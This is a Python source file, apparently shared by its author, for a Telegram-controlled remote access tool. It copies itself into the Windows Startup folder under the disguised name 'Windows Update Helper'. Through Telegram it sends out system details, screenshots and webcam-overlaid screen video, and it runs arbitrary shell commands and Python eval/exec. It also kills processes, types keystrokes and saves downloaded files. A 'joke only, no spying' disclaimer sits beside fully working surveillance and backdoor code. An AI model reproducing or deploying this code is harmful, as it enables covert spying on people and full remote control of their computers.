'''
████████╗░██████╗░  ██████╗░░█████╗░████████╗
╚══██╔══╝██╔════╝░  ██╔══██╗██╔══██╗╚══██╔══╝
░░░██║░░░██║░░██╗░  ██████╔╝███████║░░░██║░░░
░░░██║░░░██║░░╚██╗  ██╔══██╗██╔══██║░░░██║░░░
░░░██║░░░╚██████╔╝  ██║░░██║██║░░██║░░░██║░░░
░░░╚═╝░░░░╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
=============================================
            ｂｙ ｂ１ｔ０ｎｅ
        tg: https://t.me/u53rnm3
    github: https://github.com/ArtemChikc
'''
from api import api
import telebot
from telebot import types
from tabulate import tabulate
import time
import pyautogui as pag
import webbrowser
import sys
import numpy as np
import shutil
import os
import random
import platform
import psutil
import cv2
from PIL import Image, ImageTk
import tkinter as tk
from tkinter.messagebox import *
import threading
import re
import soundfile as sf
import sounddevice as sd
import traceback

# pip install pyTelegramBotAPI tabulate PyAutoGUI numpy opencv-python Pillow psutil soundfile sounddevice



# --- ДОПОЛНИТЕЛЬНО ---

screen_size = pag.size()
fps = 15
duration = 5
fourcc = cv2.VideoWriter_fourcc(*"mp4v")
video_filename = "screen_record.mp4"

def vid_capture():
    for i in range(5):
        webcam = cv2.VideoCapture(i)
        if webcam.isOpened():
            break
    webcam_width = int(screen_size.width * 0.25)
    webcam_height = int(screen_size.height * 0.3)

    out = cv2.VideoWriter(video_filename, fourcc, fps, screen_size)

    for i in range(fps*duration):
        img = pag.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        try:
            ret, webcam_frame = webcam.read()
            if ret:
                webcam_frame = cv2.resize(webcam_frame, (webcam_width, webcam_height))
                frame[0:webcam_height, 0:webcam_width] = webcam_frame
        except: pass
        out.write(frame)

    out.release()
    webcam.release()

    return open("screen_record.mp4", "rb")


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def pcinfo():
    my_system = platform.uname()
    pc_info = '\n\n'+'='*15+'PC Info'+'='*15
    pc_info += '\n'+f"Система: {my_system.system}"
    pc_info += '\n'+f"Имя узла: {my_system.node}"
    pc_info += '\n'+f"Релиз: {my_system.release}"
    pc_info += '\n'+f"Версия: {my_system.version}"
    pc_info += '\n'+f"Машина: {my_system.machine}"
    pc_info += '\n'+f"Процессор: {my_system.processor}"

    pc_info += '\n\n'+"="*10+" CPU Info "+"="*10
    # number of cores
    pc_info += '\n'+"Physical cores: "+str(psutil.cpu_count(logical=False))
    pc_info += '\n'+"Total cores: "+str(psutil.cpu_count(logical=True))
    # CPU frequencies
    cpufreq = psutil.cpu_freq()
    pc_info += '\n'+f"Max Frequency: {cpufreq.max:.2f}Mhz"
    pc_info += '\n'+f"Min Frequency: {cpufreq.min:.2f}Mhz"
    pc_info += '\n'+f"Current Frequency: {cpufreq.current:.2f}Mhz"

    pc_info += '\n'+'\n'+"="*10+" Memory Information "+"="*10
    # get the memory details
    svmem = psutil.virtual_memory()
    pc_info += '\n'+f"Total: {get_size(svmem.total)}"
    pc_info += '\n'+f"Available: {get_size(svmem.available)}"
    pc_info += '\n'+f"Used: {get_size(svmem.used)}"
    pc_info += '\n'+f"Percentage: {svmem.percent}%"
    pc_info += '\n'+"="*5+" SWAP "+"="*5
    # get the swap memory details (if exists)
    swap = psutil.swap_memory()
    pc_info += '\n'+f"Total: {get_size(swap.total)}"
    pc_info += '\n'+f"Free: {get_size(swap.free)}"
    pc_info += '\n'+f"Used: {get_size(swap.used)}"
    pc_info += '\n'+f"Percentage: {swap.percent}%"

    pc_info += '\n'+'\n'+"="*10+" Disk Information "+"="*10
    pc_info += '\n'+"Partitions and Usage:"
    # get all disk partitions
    partitions = psutil.disk_partitions()
    for partition in partitions:
        pc_info += '\n'+f"=== Device: {partition.device} ==="
        pc_info += '\n'+f"  Mountpoint: {partition.mountpoint}"
        pc_info += '\n'+f"  File system type: {partition.fstype}"
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue
        pc_info += '\n'+f"  Total Size: {get_size(partition_usage.total)}"
        pc_info += '\n'+f"  Used: {get_size(partition_usage.used)}"
        pc_info += '\n'+f"  Free: {get_size(partition_usage.free)}"
        pc_info += '\n'+f"  Percentage: {partition_usage.percent}%"
    # get IO statistics since boot
    disk_io = psutil.disk_io_counters()
    pc_info += '\n'+f"Total read: {get_size(disk_io.read_bytes)}"
    pc_info += '\n'+f"Total write: {get_size(disk_io.write_bytes)}"

    pc_info += '\n\n'+"="*10+" Network Information "+"="*10
    # get all network interfaces (virtual and physical)
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            if address.netmask!=None:
                pc_info += '\n'+f"=== Interface: {interface_name} ==="
                pc_info += '\n'+f"  IP/MAC Address: {address.address}"
                pc_info += '\n'+f"  Netmask: {address.netmask}"
                pc_info += '\n'+f"  Broadcast IP/MAC: {address.broadcast}"
    # get IO statistics since boot
    net_io = psutil.net_io_counters()
    pc_info += '\n'+f"Total Bytes Sent: {get_size(net_io.bytes_sent)}"
    pc_info += '\n'+f"Total Bytes Received: {get_size(net_io.bytes_recv)}"
    return pc_info


def get_processes_table(task=None):
    process_dict = {}
    headers = ["Имя", "Кол-во", "ЦП (%)", "Память (MB)"]

    for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_info']):
        proc.cpu_percent()
    time.sleep(1)

    for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_info']):
        try:
            name = proc.info['name']
            if task and name.lower() != task.lower():
                continue

            cpu = proc.info['cpu_percent']
            memory = proc.info['memory_info'].rss / (1024 * 1024)  # в MB

            if name in process_dict:
                process_dict[name]['cpu'] += cpu
                process_dict[name]['memory'] += memory
                process_dict[name]['count'] += 1
            else:
                process_dict[name] = {'cpu': cpu,
                                      'memory': memory,
                                      'count': 1}
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    processes = []
    for name, data in process_dict.items():
        processes.append([name[:20],
                          data['count'],
                          f"{data['cpu']:.1f}",
                          f"{data['memory']:.1f}"])

    processes.sort(key=lambda x: float(x[2]), reverse=True)

    return tabulate(processes[:20], headers=headers, tablefmt="simple")



# --- ТЕЛЕГА ---

bot = telebot.TeleBot(api)
key = api.split(":")[0]


# --- ЮЗЕРС ---

ENCRYPTED_IDS_FILE = "localdata.txt"
ENCRYPTION_KEY = api.split(":")[1]

# XOR-шифрование/расшифровка
def xor_crypt(data, key):
    key = key.encode('utf-8')
    data = data.encode('utf-8') if isinstance(data, str) else data
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Чтение зашифрованных ID из файла
def load_encrypted_ids():
    if not os.path.exists(ENCRYPTED_IDS_FILE):
        return []
    with open(ENCRYPTED_IDS_FILE, "rb") as f:
        return [line.strip() for line in f.readlines()]

# Добавление нового ID (с шифрованием)
def add_user_id(user_id):
    encrypted_id = xor_crypt(str(user_id), ENCRYPTION_KEY)
    with open(ENCRYPTED_IDS_FILE, "ab") as f:
        f.write(encrypted_id + b"\n")

# Расшифровка всех ID
def decrypt_all_ids():
    encrypted_ids = load_encrypted_ids()
    return [xor_crypt(eid, ENCRYPTION_KEY).decode('utf-8') for eid in encrypted_ids]



# --- РАБОТА ---

@bot.message_handler(commands=['start'])
def welcome(message):
    if message.chat.type=='private' and str(message.from_user.id) in decrypt_all_ids():
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)

        markup.add(types.KeyboardButton("/b volumeup"), types.KeyboardButton("/b volumedown"), types.KeyboardButton("/b win"))
        markup.add(types.KeyboardButton("/b esc"), types.KeyboardButton("/b f11"), types.KeyboardButton("/b capslock"))
        markup.add(types.KeyboardButton("/b shift+alt"), types.KeyboardButton("/b alt+f4"), types.KeyboardButton("/b alt+tab"))
        markup.add(types.KeyboardButton("/see_process"), types.KeyboardButton("/screen"), types.KeyboardButton("/video"))

        pc_info = pcinfo()
        help_c = '''================ Работа ================
Команды:
/dota_msg *** -отправить сообщение, если чел играет в доту
/see_process (***) -получить список процессов и их нагрузку, возможно просмотреть определённый процесс
/cl_process *** -закрыть процесс (explorer.exe)
/op_process *** -открыть процесс (notepad.exe)
/op_site *** -открыть сайт
/eval ***
/exec *** -выполнить Python команду(ы)
/msg_i или /msg_e *** -вывести на экран сообщение в виде инфо или в виде ошибки
/screen -получить скрин с компа
/video -получить 5 секундное видео с компа
так же есть команды: /c *** -сист. команда, /b *** -прожать кнопку(и) (можно написать "random"), /t *** -написать текст

Дополнительные функции:
-на все предыдущие команды можно написать количевство их выполнения
-можно писать скрипты (выполнение комманд по очереди в одном сообщении), для этого команды надо писать на разных строках, можно использовать команду /sl *** -ожидание в секундах
-есть возможность изменять громкость используя команду /b (volumeup или volumedown)
-можно прислать файлы чтоб они открылись: фото (есть атрибут -fs для полноэкранного режима) и звуковой файл

ПРОГРАММА СДЕЛАНА ИСКЛЮЧИТЕЛЬНО В ШУТОЧНЫХ ЦЕЛЯХ!!! КАТЕГОРИЧЕСКИ НЕЛЬЗЯ ИСПОЛЬЗОВАТЬ ДЛЯ НАНЕСЕНИЯ ВРЕДА КОМПЬЮТЕРУ И СЛЕЖКИ!!!

<b><i>by b1t0ne</i></b> @u53rnm3
github: https://github.com/ArtemChikc'''

        pag.screenshot('screen.png')
        bot.send_message(message.chat.id, f"{pc_info}\n\n{help_c}".format(message.from_user, bot.get_me()), parse_mode="HTML", reply_markup=markup)
        bot.send_photo(message.chat.id, open('screen.png', 'rb'))

        try:
            os.remove('screen.png')
        except: pass
        try:
            os.remove('screen_record.mp4')
        except: pass


def split_command(input_str):
    pattern = r'^/(\w+)(?:\s+(?:\((.*?)\)|([^)\d]+))(?:\s+(\d+))?)?$'
    match = re.match(pattern, input_str.strip())
    if not match:
        return None

    command = f"/{match.group(1)}"

    text = match.group(2) if match.group(2) is not None else match.group(3)
    count = match.group(4) if match.group(4) is not None else "1"
    text = text.strip() if text is not None else ""

    return [command, text, int(count)]


def send_key(key_str: str):
    keys = key_str.split('+')
    if len(keys)==1:
        pag.press(keys[0])
    else:
        pag.hotkey(*keys)


def show_message(command, text):
    parts = text.split(maxsplit=1)
    title = parts[0] if len(parts) > 1 else ""
    message = parts[1] if len(parts) > 1 else text

    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)

    if command == '/msg_i':
        showinfo(title=title, message=message)
    elif command == '/msg_e':
        showerror(title=title, message=message)

    root.update()
    root.destroy()


@bot.message_handler(content_types=["text"])
def wtf(message):
    global duration
    try:
        if message.chat.type=='private' and str(message.from_user.id) in decrypt_all_ids():
            commands = message.text.splitlines()

            for com in commands:
                text_split = split_command(com.strip())

                for i in range(text_split[2]):
                    if text_split[0]=='/sl':
                        time.sleep(int(text_split[1]))

                    elif text_split[0]=='/dota_msg':
                        send_key("shift+enter")
                        time.sleep(0.3)
                        pag.typewrite(text_split[1], interval=0.01)
                        send_key("enter")

                    elif text_split[0]=='/see_process':
                        if text_split[1]:
                            task = text_split[1]
                        else:
                            task = None
                        bot.send_message(message.chat.id, f"```\n{get_processes_table(task)}\n```", parse_mode='MarkdownV2')

                    elif text_split[0]=='/cl_process':
                        try:
                            os.system(f'taskkill /f /im {text_split[1]}')
                        except:
                            pass

                    elif text_split[0]=='/op_process':
                        try:
                            os.startfile(text_split[1])
                        except:
                            pass

                    elif text_split[0]=='/op_site':
                        webbrowser.open(text_split[1], new=2)
                        time.sleep(1)
                        send_key("f11")

                    elif text_split[0]=='/screen':
                        pag.screenshot('screen.png')
                        bot.send_photo(message.chat.id, open('screen.png', 'rb'))

                    elif text_split[0]=='/eval':
                        try:
                            bot.send_message(message.chat.id, eval(text_split[1]))
                        except Exception as e:
                            bot.send_message(message.chat.id, str(e))
                    
                    elif text_split[0]=='/exec':
                        try:
                            bot.send_message(message.chat.id, exec(text_split[1]))
                        except Exception as e:
                            bot.send_message(message.chat.id, str(e))

                    elif text_split[0]=='/msg_i' or '/msg_e':
                        show_message(text_split[0], text_split[1])

                    elif text_split[0]=="/b":
                        keys = ['f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
                                'esc', 'tab', 'capslock', 'shift', 'ctrl', 'alt', 'enter', 'space', 'backspace'] + \
                                    list('abcdefghijklmnopqrstuvwxyz')
                        modifiers = ['shift', 'ctrl', 'alt']
                        if text_split[1]=='random':
                            if random.choices([True, False], weights=[30, 70])[0]:
                                buttons = f"{random.choice(modifiers)}+{random.choice(keys)}"
                            else:
                                buttons = random.choice(keys)
                        else:
                            buttons = text_split[1]
                        send_key(buttons)
                    elif text_split[0]=="/t":
                        try:
                            send_key(text_split[1])
                        except:
                            pag.typewrite(text_split[1], interval=0.01)
                            send_key("enter")
                    elif text_split[0]=="/c":
                        os.system(text_split[1])

                    if (text_split[0] in ["/exec", "/op_site", "/op_process", "/cl_process", "/dota_msg"] and len(commands)==1) or text_split[0]=="/video":
                        if len(text_split)>=4:
                            duration = int(text_split[3])
                        bot.send_video(message.chat.id, vid_capture())

            bot.delete_message(message.chat.id, message.message_id)

        elif message.text==key and not str(message.from_user.id) in decrypt_all_ids():
            add_user_id(str(message.from_user.id))

    except Exception as e:
        bot.send_message(message.chat.id, "ОШИБКА: "+traceback.format_exc())


def open_win(file_name):
    image = Image.open(file_name)
    image_width, image_height = image.size
    root = tk.Tk()
    root.resizable(0, 0)
    root.wm_attributes("-topmost", 1)
    root.overrideredirect(True)
    root.geometry(f"{image_width}x{image_height}+{(screen_size[0] - image_width)//2}+{(screen_size[1] - image_height)//2}")
    tk_image = ImageTk.PhotoImage(image)
    label = tk.Label(root, image=tk_image)
    label.pack()
    label.bind("<Button-1>", lambda event: root.destroy())
    root.mainloop()

def play_sound(file_path):
    data, samplerate = sf.read(file_path)
    sd.play(data, samplerate)
    sd.wait()


@bot.message_handler(content_types=['audio', 'document', 'photo', 'gif'])
def handle_audio_photo_gif(message):
    if message.chat.type=='private' and str(message.from_user.id) in decrypt_all_ids():
        if message.content_type=='photo':
            photo = message.photo[-1]
            file_info = bot.get_file(photo.file_id)
            file_extension = os.path.splitext(file_info.file_path)[1]
            file_name = f"image{file_extension}"
            try:
                with open(file_name, "wb") as new_file:
                    new_file.write(bot.download_file(file_info.file_path))
            except:
                return

            if "-fs" in (message.caption or ""):
                image = cv2.imread(file_name)
                screen_width, screen_height = pag.size()
                resized_image = cv2.resize(image, (screen_width, screen_height))
                cv2.imwrite(file_name, resized_image)

        else:
            if message.content_type=='audio':
                file_info = bot.get_file(message.audio.file_id)
                file_extension = os.path.splitext(file_info.file_path)[1]
                file_name = f"audio{file_extension}"

            elif message.content_type=='gif':
                file_info = bot.get_file(message.document.file_id)
                file_extension = os.path.splitext(file_info.file_path)[1]
                if file_extension.lower() == '.gif':
                    file_name = "animation.gif"

            try:
                with open(file_name, "wb") as new_file:
                    new_file.write(bot.download_file(file_info.file_path))
            except:
                return

        if message.content_type=='audio':
            threading.Thread(target=play_sound, args=(file_name,), daemon=True).start()
        else:
            threading.Thread(target=open_win, args=(file_name,), daemon=True).start()

        bot.send_video(message.chat.id, vid_capture())


@bot.message_handler(content_types=["document"])
def update(message):
    if message.chat.type=='private' and str(message.from_user.id) in decrypt_all_ids() and '-d' in message.caption:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            original_filename = message.document.file_name
            with open(original_filename, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.send_message(message.chat.id, f"Файл {original_filename} успешно сохранён")
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка при сохранении файла: {traceback.format_exc()}")



app_name = "Windows Update Helper"
def copy_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows',
                                'Start Menu', 'Programs', 'Startup', app_name)
    os.makedirs(startup_path, exist_ok=True)
    current_program = os.path.abspath(sys.argv[0])
    target_program = os.path.join(startup_path, os.path.basename(current_program))
    if not os.path.exists(target_program):
        shutil.copy2(current_program, target_program)
    return target_program


def main():
    copy_to_startup()
    for id in decrypt_all_ids():
        bot.send_message(id, "Компьютер запущен.")
    bot.polling(interval=1, skip_pending=True)



if __name__ == "__main__":
    main()